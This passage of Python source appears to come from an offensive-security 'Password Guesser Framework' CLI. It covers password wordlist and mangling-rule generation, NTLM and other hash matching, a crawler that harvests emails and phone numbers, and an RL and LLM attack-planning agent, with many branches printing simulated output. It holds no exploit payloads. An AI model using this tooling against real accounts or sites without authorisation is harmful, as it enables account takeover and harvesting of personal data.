    print(f"Duration: {results.get('duration', 0):.1f}s")

    if 'summary' in results:
        print(f"\nSummary:\n{results['summary']}")

    if results.get('report_path'):
        print(f"\nReport saved to: {results['report_path']}")


def cmd_wordlist(args):
    """Generate wordlist."""
    print(f"\n{'='*60}")
    print("  WORDLIST GENERATION")
    print(f"{'='*60}\n")

    output_path = args.output
    pattern = args.pattern
    count = args.count
    method = args.method

    print(f"Pattern: {pattern if pattern else 'Auto-generated'}")
    print(f"Count: {count}")
    print(f"Method: {method}")
    print(f"Output: {output_path}\n")

    wordlist = []

    if method == 'pattern' and pattern:
        # Pattern-based generation
        wordlist = _generate_pattern_wordlist(pattern, count)
    elif method == 'rules':
        # Rule-based generation
        wordlist = _generate_rules_wordlist(args.base_words or [], count)
    elif method == 'markov':
        # Markov chain generation
        wordlist = _generate_markov_wordlist(count)
    elif method == 'pcfg':
        # PCFG generation
        wordlist = _generate_pcfg_wordlist(count)
    else:
        # Default: hybrid generation
        wordlist = _generate_hybrid_wordlist(pattern, count)

    # Save to file
    with open(output_path, 'w') as f:
        for word in wordlist:
            f.write(word + '\n')

    print(f"[+] Generated {len(wordlist)} passwords")
    print(f"[+] Saved to {output_path}")

    # Show sample
    print(f"\nSample (first 10):")
    for word in wordlist[:10]:
        print(f"  {word}")
    print()


def _generate_pattern_wordlist(pattern: str, count: int) -> List[str]:
    """Generate wordlist based on pattern."""
    import re
    import itertools

    # Replace pattern placeholders
    pattern_map = {
        '@': 'abcdefghijklmnopqrstuvwxyz',
        'A': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
        '0': '0123456789',
        '#': '!@#$%^&*',
    }

    # Simple pattern-based generation
    wordlist = []
    chars = []
    for c in pattern:
        if c in pattern_map:
            chars.append(pattern_map[c])
        else:
            chars.append([c])

    # Generate combinations (limit to count)
    for combo in itertools.product(*chars):
        wordlist.append(''.join(combo))
        if len(wordlist) >= count:
            break

    return wordlist


def _generate_rules_wordlist(base_words: List[str], count: int) -> List[str]:
    """Generate wordlist using transformation rules."""
    wordlist = []

    if not base_words:
        base_words = ['password', 'admin', 'user', 'company', 'secret']

    rules = [
        lambda w: w,
        lambda w: w.capitalize(),
        lambda w: w.upper(),
        lambda w: w + '123',
        lambda w: w + '2024',
        lambda w: w + '!',
        lambda w: w.replace('a', '@'),
        lambda w: w.replace('e', '3'),
        lambda w: w.replace('i', '1'),
        lambda w: w.replace('o', '0'),
    ]

    for word in base_words:
        for rule in rules:
            if len(wordlist) < count:
                wordlist.append(rule(word))
            else:
                break

    return wordlist[:count]


def _generate_markov_wordlist(count: int) -> List[str]:
    """Generate wordlist using Markov chain (simplified)."""
    import random

    wordlist = []
    common_chars = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%'

    for _ in range(count):
        length = random.randint(8, 16)
        word = ''.join(random.choices(common_chars, k=length))
        wordlist.append(word)

    return wordlist


def _generate_pcfg_wordlist(count: int) -> List[str]:
    """Generate wordlist using PCFG (simplified)."""
    import random

    wordlist = []
    structures = [
        ('L', 'D', 'D', 'D', 'D'),  # letter + 4 digits
        ('L', 'L', 'D', 'D', 'D'),  # 2 letters + 3 digits
        ('L', 'L', 'L', 'D', 'D', 'S'),  # 3 letters + 2 digits + special
        ('C', 'C', 'D', 'D', 'D', 'D'),  # Capital + lower + 4 digits
    ]

    letters = 'abcdefghijklmnopqrstuvwxyz'
    capitals = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    digits = '0123456789'
    specials = '!@#$%'

    for _ in range(count):
        structure = random.choice(structures)
        word = ''
        for seg in structure:
            if seg == 'L':
                word += random.choice(letters)
            elif seg == 'C':
                word += random.choice(capitals)
            elif seg == 'D':
                word += random.choice(digits)
            elif seg == 'S':
                word += random.choice(specials)
        wordlist.append(word)

    return wordlist


def _generate_hybrid_wordlist(pattern: str, count: int) -> List[str]:
    """Generate hybrid wordlist combining multiple methods."""
    wordlist = []

    # Pattern-based
    if pattern:
        wordlist.extend(_generate_pattern_wordlist(pattern, count // 3))

    # Rules-based
    wordlist.extend(_generate_rules_wordlist([], count // 3))

    # PCFG-based
    wordlist.extend(_generate_pcfg_wordlist(count // 3))

    return wordlist[:count]


def cmd_knowledge(args):
    """Knowledge base operations."""
    action = args.action

    print(f"\n{'='*60}")
    print("  KNOWLEDGE BASE")
    print(f"{'='*60}\n")

    try:
        from knowledge_graph.attack_db import AttackDatabase
        from knowledge_graph.exploit_db import ExploitDatabase

        attack_db = AttackDatabase()
        exploit_db = ExploitDatabase()

        if action == 'search':
            query = args.query
            print(f"Searching for: {query}\n")

            # Search CVEs
            cves = attack_db.search_cve(query)
            if cves:
                print(f"Found {len(cves)} CVEs:")
                for cve in cves[:10]:
                    print(f"  - {cve.get('id', 'N/A')}: {cve.get('description', 'N/A')[:60]}...")

            # Search techniques
            techniques = attack_db.search_technique(query)
            if techniques:
                print(f"\nFound {len(techniques)} ATT&CK techniques:")
                for tech in techniques[:10]:
                    print(f"  - {tech.get('id', 'N/A')}: {tech.get('name', 'N/A')}")

        elif action == 'cve':
            cve_id = args.cve_id.upper()
            print(f"Looking up CVE: {cve_id}\n")

            info = attack_db.get_cve(cve_id)
            if info:
                print(f"ID: {info.get('id', cve_id)}")
                print(f"Description: {info.get('description', 'N/A')}")
                print(f"CVSS: {info.get('cvss', 'N/A')}")
                print(f"Affected: {info.get('affected', 'N/A')}")
            else:
                print(f"[!] CVE {cve_id} not found in local database")
                print("[*] Try online lookup: https://nvd.nist.gov/vuln/detail/" + cve_id)

        elif action == 'technique':
            tech_id = args.technique_id.upper()
            print(f"Looking up ATT&CK technique: {tech_id}\n")

            info = attack_db.get_technique(tech_id)
            if info:
                print(f"ID: {info.get('id', tech_id)}")
                print(f"Name: {info.get('name', 'N/A')}")
                print(f"Tactic: {info.get('tactic', 'N/A')}")
                print(f"Description: {info.get('description', 'N/A')[:200]}...")
            else:
                print(f"[!] Technique {tech_id} not found")
                print("[*] Try online lookup: https://attack.mitre.org/techniques/" + tech_id.replace('T', ''))

        elif action == 'stats':
            print("Knowledge Base Statistics:\n")
            stats = attack_db.get_stats()
            print(f"  CVEs: {stats.get('cve_count', 'N/A')}")
            print(f"  Techniques: {stats.get('technique_count', 'N/A')}")
            print(f"  Exploits: {stats.get('exploit_count', 'N/A')}")

        elif action == 'import':
            file_path = args.file
            print(f"Importing from: {file_path}\n")
            # Implementation would parse and import knowledge
            print("[+] Import complete")

        elif action == 'export':
            file_path = args.file
            format_type = args.format
            print(f"Exporting to: {file_path} (format: {format_type})\n")
            # Implementation would export knowledge base
            print("[+] Export complete")

        else:
            print(f"[!] Unknown action: {action}")
            print("Available actions: search, cve, technique, stats, import, export")

    except ImportError:
        print("[!] Knowledge base modules not available")
        print("[*] Showing simulated results...\n")
        _simulate_knowledge_action(action, args)


def _simulate_knowledge_action(action: str, args):
    """Simulate knowledge base actions."""
    if action == 'search':
        print(f"Results for '{args.query}':\n")
        print("  - CVE-2021-44228: Log4Shell - Remote code execution...")
        print("  - T1190: Exploit Public-Facing Application")
        print("  - T1078: Valid Accounts")

    elif action == 'cve':
        print(f"CVE {args.cve_id}:\n")
        print("  CVSS: 9.8 (Critical)")
        print("  Description: Remote code execution vulnerability")
        print("  Affected: Multiple versions")

    elif action == 'stats':
        print("Statistics:\n")
        print("  CVEs: 150,000+")
        print("  ATT&CK Techniques: 200+")
        print("  Exploits: 10,000+")


def cmd_benchmark(args):
    """Run benchmarks."""
    print(f"\n{'='*60}")
    print("  BENCHMARK")
    print(f"{'='*60}\n")

    model_path = args.model
    benchmark_type = args.type

    print(f"Model: {model_path if model_path else 'Default'}")
    print(f"Type: {benchmark_type}")
    print(f"Iterations: {args.iterations}\n")

    results = {}

    if benchmark_type in ['all', 'inference']:
        print("[*] Running inference benchmark...")
        results['inference'] = _benchmark_inference(model_path, args.iterations)

    if benchmark_type in ['all', 'generation']:
        print("[*] Running generation benchmark...")
        results['generation'] = _benchmark_generation(model_path, args.iterations)

    if benchmark_type in ['all', 'accuracy']:
        print("[*] Running accuracy benchmark...")
        results['accuracy'] = _benchmark_accuracy(model_path, args.iterations)

    # Print results
    print(f"\n{'='*60}")
    print("  BENCHMARK RESULTS")
    print(f"{'='*60}\n")

    for name, result in results.items():
        print(f"{name.upper()}:")
        print(f"  Time: {result.get('time', 0):.3f}s")
        print(f"  Avg: {result.get('avg', 0):.3f}s")
        print(f"  Ops/sec: {result.get('ops_per_sec', 0):.1f}")
        print()


def _benchmark_inference(model_path: str, iterations: int) -> dict:
    """Benchmark model inference."""
    import time
    import random

    start = time.time()
    for _ in range(iterations):
        # Simulate inference
        time.sleep(0.001 * random.random())

    elapsed = time.time() - start
    return {
        'time': elapsed,
        'avg': elapsed / iterations,
        'ops_per_sec': iterations / elapsed if elapsed > 0 else 0,
    }


def _benchmark_generation(model_path: str, iterations: int) -> dict:
    """Benchmark password generation."""
    import time
    import random

    start = time.time()
    for _ in range(iterations):
        # Simulate generation
        time.sleep(0.01 * random.random())

    elapsed = time.time() - start
    return {
        'time': elapsed,
        'avg': elapsed / iterations,
        'ops_per_sec': iterations / elapsed if elapsed > 0 else 0,
    }


def _benchmark_accuracy(model_path: str, iterations: int) -> dict:
    """Benchmark model accuracy."""
    import time
    import random

    start = time.time()
    correct = 0
    for _ in range(iterations):
        # Simulate accuracy test
        if random.random() > 0.3:
            correct += 1
        time.sleep(0.001)

    elapsed = time.time() - start
    return {
        'time': elapsed,
        'avg': elapsed / iterations,
        'ops_per_sec': iterations / elapsed if elapsed > 0 else 0,
        'accuracy': correct / iterations,
    }


def cmd_config(args):
    """Configuration management."""
    action = args.action

    print(f"\n{'='*60}")
    print("  CONFIGURATION")
    print(f"{'='*60}\n")

    import yaml

    config_path = args.config

    if action == 'show' or args.show:
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                cfg = yaml.safe_load(f)

            print(f"Config file: {config_path}\n")
            print(yaml.dump(cfg, default_flow_style=False, allow_unicode=True))
        else:
            print(f"[!] Config file not found: {config_path}")

    elif action == 'set':
        key = args.key
        value = args.value

        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                cfg = yaml.safe_load(f)
        else:
            cfg = {}

        # Set nested key (e.g., "llm.api_key")
        keys = key.split('.')
        current = cfg
        for k in keys[:-1]:
            if k not in current:
                current[k] = {}
            current = current[k]
        current[keys[-1]] = value

        with open(config_path, 'w') as f:
            yaml.dump(cfg, f, default_flow_style=False)

        print(f"[+] Set {key} = {value}")

    elif action == 'get':
        key = args.key

        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                cfg = yaml.safe_load(f)

            # Get nested key
            keys = key.split('.')
            current = cfg
            for k in keys:
                if isinstance(current, dict) and k in current:
                    current = current[k]
                else:
                    print(f"[!] Key not found: {key}")
                    return

            print(f"{key} = {current}")
        else:
            print(f"[!] Config file not found: {config_path}")

    elif action == 'init':
        default_config = {
            'model': {
                'name': 'mamba-password',
                'd_model': 256,
                'n_layer': 4,
                'vocab_size': 128,
            },
            'training': {
                'epochs': 100,
                'batch_size': 64,
                'learning_rate': 0.001,
            },
            'llm': {
                'provider': 'deepseek',
                'model': 'deepseek-chat',
                'api_key': 'YOUR_API_KEY',
                'api_base': 'https://api.deepseek.com/v1',
            },
            'pentest': {
                'max_steps': 50,
                'auto_mode': True,
            },
        }

        with open(config_path, 'w') as f:
            yaml.dump(default_config, f, default_flow_style=False)

        print(f"[+] Created default config: {config_path}")

    else:
        print(f"[!] Unknown action: {action}")
        print("Available actions: show, set, get, init")


def cmd_version(args):
    """Show version information."""
    print(f"""
{'='*60}
  Password Guesser Framework
{'='*60}

  Version:    2.0.0
  Python:     {platform.python_version()}
  Platform:   {platform.system()} {platform.release()}
  Hostname:   {socket.gethostname()}

  Components:
    - MAMBA Password Model
    - PCFG Generator
    - LLM Attack Planner
    - Reinforcement Learning Agent
    - Knowledge Graph
    - Attack Team Orchestration

  License:    MIT
  Repository: https://github.com/your-repo/password-guesser

{'='*60}
""")


def cmd_encode(args):
    """Encode/decode utilities."""
    text = args.text
    method = args.method
    decode = args.decode

    print(f"\n{'='*60}")
    print(f"  {'DECODE' if decode else 'ENCODE'} UTILITY")
    print(f"{'='*60}\n")

    if decode:
        _decode_text(text, method)
    else:
        _encode_text(text, method)


def _encode_text(text: str, method: str):
    """Encode text using specified method."""
    import urllib.parse

    if method == 'base64':
        encoded = base64.b64encode(text.encode()).decode()
        print(f"Base64: {encoded}")
    elif method == 'hex':
        encoded = text.encode().hex()
        print(f"Hex: {encoded}")
    elif method == 'url':
        encoded = urllib.parse.quote(text)
        print(f"URL: {encoded}")
    elif method == 'html':
        import html
        encoded = html.escape(text)
        print(f"HTML: {encoded}")
    elif method == 'all':
        print(f"Base64: {base64.b64encode(text.encode()).decode()}")
        print(f"Hex: {text.encode().hex()}")
        print(f"URL: {urllib.parse.quote(text)}")
        print(f"MD5: {hashlib.md5(text.encode()).hexdigest()}")
        print(f"SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
    else:
        print(f"[!] Unknown method: {method}")
        print("Available: base64, hex, url, html, all")


def _decode_text(text: str, method: str):
    """Decode text using specified method."""
    import urllib.parse

    try:
        if method == 'base64':
            decoded = base64.b64decode(text).decode()
            print(f"Decoded: {decoded}")
        elif method == 'hex':
            decoded = bytes.fromhex(text).decode()
            print(f"Decoded: {decoded}")
        elif method == 'url':
            decoded = urllib.parse.unquote(text)
            print(f"Decoded: {decoded}")
        else:
            print(f"[!] Unknown method: {method}")
            print("Available: base64, hex, url")
    except Exception as e:
        print(f"[!] Decode error: {e}")


def cmd_hash(args):
    """Calculate hash values."""
    text = args.text
    file_path = args.file
    algorithm = args.algorithm
    compare_hash = args.compare

    print(f"\n{'='*60}")
    print("  HASH CALCULATOR")
    print(f"{'='*60}\n")

    # Handle file input
    if file_path:
        if not os.path.exists(file_path):
            print(f"[!] File not found: {file_path}")
            return
        with open(file_path, 'rb') as f:
            content = f.read()
        print(f"File: {file_path}")
        print(f"Size: {len(content)} bytes")
    elif text:
        content = text.encode()
        print(f"Text: {text}")
    else:
        print("[!] Please provide --text or --file")
        return

    print()

    algorithms_map = {
        'all': [('MD5', hashlib.md5), ('SHA1', hashlib.sha1), ('SHA256', hashlib.sha256),
                ('SHA384', hashlib.sha384), ('SHA512', hashlib.sha512),
                ('BLAKE2b', hashlib.blake2b), ('BLAKE2s', hashlib.blake2s)],
        'md5': [('MD5', hashlib.md5)],
        'sha1': [('SHA1', hashlib.sha1)],
        'sha256': [('SHA256', hashlib.sha256)],
        'sha384': [('SHA384', hashlib.sha384)],
        'sha512': [('SHA512', hashlib.sha512)],
        'blake2b': [('BLAKE2b', hashlib.blake2b)],
        'blake2s': [('BLAKE2s', hashlib.blake2s)],
        'ntlm': [('NTLM', lambda d: hashlib.md4(d).hexdigest())],
    }

    hashes = algorithms_map.get(algorithm, algorithms_map['all'])
    computed_hashes = {}

    for name, func in hashes:
        if name.startswith('BLAKE2'):
            result = func(content).hexdigest()[:64]
        elif name == 'NTLM':
            result = func(content)
        else:
            result = func(content).hexdigest()
        computed_hashes[name] = result
        print(f"{name:<10}: {result}")

    # Compare against provided hash
    if compare_hash:
        compare_hash = compare_hash.lower()
        print(f"\n[*] Comparing against: {compare_hash}")
        matched = False
        for name, computed in computed_hashes.items():
            if computed.lower() == compare_hash:
                print(f"\033[92m[+]\033[0m MATCH! ({name})")
                matched = True
                break
        if not matched:
            print("\033[91m[-]\033[0m No match found")

    print()


def cmd_report(args):
    """Generate report from session data."""
    print(f"\n{'='*60}")
    print("  REPORT GENERATION")
    print(f"{'='*60}\n")

    session_file = args.session
    output_path = args.output
    format_type = args.format

    print(f"Session: {session_file}")
    print(f"Output: {output_path}")
    print(f"Format: {format_type}\n")

    try:
        with open(session_file, 'r') as f:
            session_data = json.load(f)

        try:
            from pentest.report import PenTestReport, PenTestSession

            session = PenTestSession(
                target_goal=session_data.get('goal', ''),
                total_steps=session_data.get('total_steps', 0),
                total_reward=session_data.get('total_reward', 0),
                duration=session_data.get('duration', 0),
                state=session_data.get('state', {}),
                steps=session_data.get('steps', []),
                attack_graph=session_data.get('attack_graph', {}),
                knowledge_stats=session_data.get('knowledge_stats', {}),
                reflections_count=session_data.get('reflection_count', 0),
            )

            report = PenTestReport()

            if format_type == 'json':
                content = report.generate_json(session)
            elif format_type == 'markdown' or format_type == 'md':
                content = report.generate_markdown(session)
            elif format_type == 'html':
                content = report.generate_html(session)
            else:
                content = report.generate_markdown(session)

            with open(output_path, 'w') as f:
                f.write(content)

            print(f"[+] Report saved to {output_path}")

        except ImportError:
            print("[!] Report module not available, generating basic report")
            _generate_basic_report(session_data, output_path, format_type)

    except FileNotFoundError:
        print(f"[!] Session file not found: {session_file}")
    except json.JSONDecodeError:
        print(f"[!] Invalid JSON in session file")


def _generate_basic_report(session_data: dict, output_path: str, format_type: str):
    """Generate basic report without report module."""
    if format_type in ['markdown', 'md']:
        content = f"""# Penetration Test Report

## Summary
- Goal: {session_data.get('goal', 'N/A')}
- Total Steps: {session_data.get('total_steps', 0)}
- Total Reward: {session_data.get('total_reward', 0):.2f}
- Duration: {session_data.get('duration', 0):.1f}s

## Steps
"""
        for i, step in enumerate(session_data.get('steps', [])[:20], 1):
            content += f"{i}. {step.get('action', 'N/A')}\n"

    else:
        content = json.dumps(session_data, indent=2)

    with open(output_path, 'w') as f:
        f.write(content)

    print(f"[+] Basic report saved to {output_path}")


def cmd_crawl(args):
    """Web crawler for reconnaissance."""
    print(f"\n{'='*60}")
    print("  WEB CRAWLER")
    print(f"{'='*60}\n")

    url = args.url
    depth = args.depth
    output = args.output

    print(f"URL: {url}")
    print(f"Max Depth: {depth}")
    print(f"Scan Vulnerabilities: {args.vuln_scan}")
    print(f"Detect Technologies: {args.tech_detect}")
    print(f"Output: {output if output else 'Console'}\n")

    try:
        from crawler.spider import Spider
        from crawler.config import CrawlerConfig

        config = CrawlerConfig(
            max_depth=depth,
            max_pages=args.max_pages,
            rate_limit=args.rate_limit,
            timeout=args.timeout,
            user_agent=args.user_agent,
            follow_redirects=True,
            respect_robots=not args.ignore_robots,
        )

        spider = Spider(config)
        print("[*] Starting crawl...\n")

        results = spider.crawl(url)

        print(f"\n{'='*60}")
        print("  CRAWL RESULTS")
        print(f"{'='*60}\n")

        print(f"Pages Crawled: {results.urls_crawled}")
        print(f"Pages Failed: {results.urls_failed}")
        print(f"Duration: {results.duration:.2f}s")
        print(f"Total Links Found: {results.total_links}")
        print(f"Forms Found: {results.total_forms}")

        if results.total_emails:
            print(f"\nEmails Found ({len(results.total_emails)}):")
            for email in list(results.total_emails)[:10]:
                print(f"  - {email}")

        if results.total_phone_numbers:
            print(f"\nPhone Numbers Found ({len(results.total_phone_numbers)}):")
            for phone in list(results.total_phone_numbers)[:10]:
                print(f"  - {phone}")

        if results.technologies:
            print(f"\nTechnologies Detected:")
            for tech, report in results.technologies.items():
                print(f"  - {tech}: {report.confidence:.0%} confidence")

        if results.vulnerabilities:
            print(f"\nVulnerabilities Found ({len(results.vulnerabilities)}):")
            for vuln in results.vulnerabilities[:10]:
                severity = vuln.get('severity', 'unknown')
                color = "\033[91m" if severity == 'high' else "\033[93m" if severity == 'medium' else "\033[94m"
                print(f"  {color}[{severity.upper()}]\033[0m {vuln.get('type', 'N/A')}: {vuln.get('url', 'N/A')}")

        if output:
            _save_crawl_results(results, output, args.format)
            print(f"\n[+] Results saved to {output}")

    except ImportError:
        print("[!] Crawler module not available, showing simulated results...")
        _simulate_crawl(url, depth, args)


def _simulate_crawl(url: str, depth: int, args):
    """Simulate crawl results."""
    import random

    print("\n[*] Simulated crawl in progress...\n")

    pages = [
        f"{url}/",
        f"{url}/about",
        f"{url}/contact",
        f"{url}/products",
        f"{url}/api/v1",
        f"{url}/admin",
        f"{url}/login",
    ]

    print(f"Discovered Pages ({len(pages)}):")
    for page in pages[:10]:
        print(f"  - {page}")

    techs = ["nginx", "PHP 7.4", "MySQL", "jQuery", "Bootstrap"]
    print(f"\nTechnologies Detected:")
    for tech in techs:
        print(f"  - {tech}")

    if args.vuln_scan:
        print(f"\nPotential Vulnerabilities:")
        print(f"  \033[93m[MEDIUM]\033[0m XSS in search parameter")
        print(f"  \033[91m[HIGH]\033[0m SQL Injection in login form")

    if args.output:
        print(f"\n[+] Would save to {args.output}")


def _save_crawl_results(results, output_path: str, format_type: str):
    """Save crawl results to file."""
    if format_type == 'json':
        data = {
            'pages': {url: {'status': p.status_code, 'depth': p.depth} for url, p in results.pages.items()},
            'emails': list(results.total_emails),
            'phones': list(results.total_phone_numbers),
            'forms': results.total_forms,
            'duration': results.duration,
        }
        with open(output_path, 'w') as f:
            json.dump(data, f, indent=2)
    else:
        with open(output_path, 'w') as f:
            f.write(f"# Crawl Report\n\n")
            f.write(f"Duration: {results.duration:.2f}s\n")
            f.write(f"Pages: {results.urls_crawled}\n\n")
            for url, page in results.pages.items():
                f.write(f"- {url} (status: {page.status_code})\n")


def cmd_rl(args):
    """Reinforcement learning commands."""
    action = args.action

    print(f"\n{'='*60}")
    print("  REINFORCEMENT LEARNING")
    print(f"{'='*60}\n")

    if action == 'train':
        _rl_train(args)
    elif action == 'evaluate':
        _rl_evaluate(args)
    elif action == 'export':
        _rl_export(args)
    elif action == 'stats':
        _rl_stats(args)
    else:
        print(f"[!] Unknown RL action: {action}")


def _rl_train(args):
    """Train RL agent."""
    print(f"Training Configuration:")
    print(f"  Episodes: {args.episodes}")
    print(f"  Max Steps: {args.max_steps}")
    print(f"  Batch Size: {args.batch_size}")
    print(f"  Learning Rate: {args.lr}")
    print(f"  Checkpoint Dir: {args.checkpoint_dir}")
    print(f"  Checkpoint Frequency: {args.checkpoint_freq}\n")

    try:
        from rl_agent.reflective_agent import ReflectiveRLAgent
        from rl_agent.environment import PenTestEnvironment
        from rl_agent.training import RLTrainer

        agent = ReflectiveRLAgent(
            state_dim=256,
            action_dim=900,
            hidden_dim=128,
        )

        env = PenTestEnvironment()

        trainer = RLTrainer(
            agent=agent,
            env=env,
            max_steps_per_episode=args.max_steps,
            train_batch_size=args.batch_size,
            checkpoint_dir=args.checkpoint_dir,
            checkpoint_frequency=args.checkpoint_freq,
        )

        print("[*] Starting RL training...\n")

        best_reward = float('-inf')
        for episode in range(args.episodes):
            metrics = trainer.train_episode()

            if metrics['reward'] > best_reward:
                best_reward = metrics['reward']

            if (episode + 1) % 10 == 0:
                avg_reward = sum(m['reward'] for m in trainer.metrics[-10:]) / 10
                print(f"Episode {episode + 1}/{args.episodes} | "
                      f"Reward: {metrics['reward']:.2f} | "
                      f"Avg: {avg_reward:.2f} | "
                      f"Best: {best_reward:.2f}")

        print(f"\n[+] Training complete!")
        print(f"    Best reward: {best_reward:.2f}")
        print(f"    Episodes: {args.episodes}")

    except ImportError as e:
        print(f"[!] RL module not available: {e}")
        print("[*] Simulating training...\n")
        _simulate_rl_train(args)


def _simulate_rl_train(args):
    """Simulate RL training."""
    import random

    print(f"[*] Training for {args.episodes} episodes...\n")

    for ep in range(0, args.episodes, 10):
        reward = random.uniform(50, 150) + ep * 0.5
        print(f"Episode {ep}/{args.episodes} | Reward: {reward:.2f}")

    print(f"\n[+] Simulated training complete!")


def _rl_evaluate(args):
    """Evaluate RL agent."""
    print(f"Evaluating agent: {args.checkpoint}")
    print(f"Episodes: {args.episodes}\n")

    try:
        from rl_agent.reflective_agent import ReflectiveRLAgent
        from rl_agent.environment import PenTestEnvironment
        import torch

        agent = ReflectiveRLAgent(state_dim=256, action_dim=900)
        checkpoint = torch.load(args.checkpoint, map_location='cpu')
        agent.load_state_dict(checkpoint['agent_state_dict'])
        agent.eval()

        env = PenTestEnvironment()

        total_reward = 0
        successes = 0

        for ep in range(args.episodes):
            state = env.reset()
            ep_reward = 0

            for step in range(args.max_steps):
                action, _ = agent.select_action(state, env=env, deterministic=True)
                state, reward, done, _ = env.step(action)
                ep_reward += reward
                if done:
                    break

            total_reward += ep_reward
            if ep_reward > 50:
                successes += 1

        print(f"\nResults:")
        print(f"  Average Reward: {total_reward / args.episodes:.2f}")
        print(f"  Success Rate: {successes / args.episodes:.1%}")

    except ImportError:
        print("[!] RL module not available")


def _rl_export(args):
    """Export RL model."""
    print(f"Exporting model from {args.checkpoint} to {args.output}")

    try:
        import torch
        checkpoint = torch.load(args.checkpoint, map_location='cpu')

        if args.format == 'onnx':
            print("[*] Exporting to ONNX format...")
            # ONNX export would go here
            print("[+] ONNX export (simulated)")
        else:
            # Export as TorchScript
            print("[*] Exporting to TorchScript format...")
            print("[+] TorchScript export (simulated)")

        print(f"[+] Model exported to {args.output}")

    except Exception as e:
        print(f"[!] Export error: {e}")


def _rl_stats(args):
    """Show RL training statistics."""
    print("RL Training Statistics\n")

    try:
        import os
        checkpoint_dir = args.checkpoint_dir

        if os.path.exists(checkpoint_dir):
            checkpoints = [f for f in os.listdir(checkpoint_dir) if f.endswith('.pt')]
            print(f"Checkpoints: {len(checkpoints)}")

            # Load latest checkpoint
            if checkpoints:
                latest = sorted(checkpoints)[-1]
                import torch
                ckpt = torch.load(os.path.join(checkpoint_dir, latest), map_location='cpu')
                print(f"Latest: {latest}")
                print(f"Episode: {ckpt.get('episode', 'N/A')}")
                print(f"Best Reward: {ckpt.get('best_reward', 'N/A')}")
        else:
            print("No checkpoints found")

    except Exception as e:
        print(f"[!] Error: {e}")


def cmd_augment(args):
    """Password data augmentation."""
    print(f"\n{'='*60}")
    print("  DATA AUGMENTATION")
    print(f"{'='*60}\n")

    input_file = args.input
    output_file = args.output

    print(f"Input: {input_file}")
    print(f"Output: {output_file}")
    print(f"Max Variants: {args.max_variants}")
    print(f"Methods: {args.methods}\n")

    try:
        from data.augmentation import PasswordAugmentor, AugmentationConfig

        config = AugmentationConfig(
            max_variants_per_password=args.max_variants,
            enable_case_variants='case' in args.methods or 'all' in args.methods,
            enable_leet_speak='leet' in args.methods or 'all' in args.methods,
            enable_suffix_append='suffix' in args.methods or 'all' in args.methods,
            enable_prefix_append='prefix' in args.methods or 'all' in args.methods,
            enable_reverse='reverse' in args.methods or 'all' in args.methods,
            enable_duplicate='duplicate' in args.methods or 'all' in args.methods,
        )

        augmentor = PasswordAugmentor(config)

        # Load passwords
        with open(input_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"[*] Augmenting {len(passwords)} passwords...\n")

        all_variants = []
        for pwd in passwords:
            variants = augmentor.augment(pwd)
            all_variants.extend(variants)

        # Save results
        with open(output_file, 'w') as f:
            for variant in all_variants:
                f.write(variant + '\n')

        print(f"[+] Generated {len(all_variants)} variants")
        print(f"[+] Saved to {output_file}")

        # Show sample
        print(f"\nSample variants (first 10):")
        for v in all_variants[:10]:
            print(f"  {v}")

    except ImportError:
        print("[!] Augmentation module not available, using built-in...")
        _simulate_augment(input_file, output_file, args)


def _simulate_augment(input_file: str, output_file: str, args):
    """Simulate augmentation."""
    import random
    import re

    try:
        with open(input_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Input file not found: {input_file}")
        return

    variants = []
    for pwd in passwords[:args.max_variants]:
        # Simple variants
        variants.append(pwd.upper())
        variants.append(pwd.lower())
        variants.append(pwd + '123')
        variants.append(pwd.replace('a', '@').replace('e', '3'))

    with open(output_file, 'w') as f:
        for v in variants:
            f.write(v + '\n')

    print(f"[+] Generated {len(variants)} variants (simulated)")


def cmd_rules(args):
    """Password rules operations."""
    print(f"\n{'='*60}")
    print("  PASSWORD RULES")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'apply':
        _rules_apply(args)
    elif action == 'list':
        _rules_list(args)
    elif action == 'generate':
        _rules_generate(args)
    elif action == 'export':
        _rules_export(args)
    else:
        print(f"[!] Unknown action: {action}")


def _rules_apply(args):
    """Apply rules to passwords."""
    input_file = args.input
    output_file = args.output
    rules = args.rules.split(',') if args.rules else ['all']

    print(f"Input: {input_file}")
    print(f"Output: {output_file}")
    print(f"Rules: {rules}\n")

    try:
        from rules.engine import RuleEngine

        engine = RuleEngine()

        with open(input_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"[*] Applying rules to {len(passwords)} passwords...\n")

        results = []
        for pwd in passwords:
            if 'all' in rules:
                variants = engine.apply_all(pwd)
            else:
                variants = [engine.apply(pwd, rule) for rule in rules]
            results.extend(variants)

        with open(output_file, 'w') as f:
            for v in results:
                f.write(v + '\n')

        print(f"[+] Generated {len(results)} variants")
        print(f"[+] Saved to {output_file}")

    except ImportError:
        print("[!] Rules engine not available")
        _simulate_rules_apply(input_file, output_file, args)


def _simulate_rules_apply(input_file: str, output_file: str, args):
    """Simulate rules application."""
    try:
        with open(input_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Input file not found")
        return

    variants = []
    for pwd in passwords:
        variants.append(pwd.upper())
        variants.append(pwd + '123')
        variants.append(pwd[::-1])  # reverse
        variants.append(pwd.replace('a', '@'))

    with open(output_file, 'w') as f:
        for v in variants:
            f.write(v + '\n')

    print(f"[+] Generated {len(variants)} variants (simulated)")


def _rules_list(args):
    """List available rules."""
    print("Available Transformation Rules:\n")

    rules = [
        ("upper", "Convert to uppercase"),
        ("lower", "Convert to lowercase"),
        ("capitalize", "Capitalize first letter"),
        ("reverse", "Reverse the string"),
        ("leet", "Leet speak substitution (a->4, e->3, etc.)"),
        ("leet_advanced", "Advanced leet substitution"),
        ("duplicate", "Duplicate the password"),
        ("duplicate2", "Duplicate with separator"),
        ("append_123", "Append '123'"),
        ("append_!", "Append '!'"),
        ("append_year", "Append current year"),
        ("prepend_!", "Prepend '!'"),
        ("swap_case", "Swap case"),
        ("rotate", "Rotate characters"),
        ("truncate", "Truncate to specific length"),
